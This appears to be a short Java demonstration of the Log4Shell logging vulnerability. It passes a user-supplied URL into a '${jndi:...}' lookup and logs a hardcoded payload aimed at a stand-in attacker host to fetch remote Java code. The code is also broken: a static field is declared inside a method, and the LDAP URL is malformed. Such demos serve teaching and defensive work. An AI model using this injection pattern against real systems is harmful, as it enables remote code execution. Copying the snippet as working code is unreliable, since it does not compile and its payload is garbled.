class Demo {
    public static void main(String[] args) {
        static Logger log = Logger.getLogger(Demo.class.getName());

        String s = readUserURL();
        log.info("${jndi:" + s + "}");
        log.info("${jndi:ldap//:hackerman.com/hack.java}");
    }
}
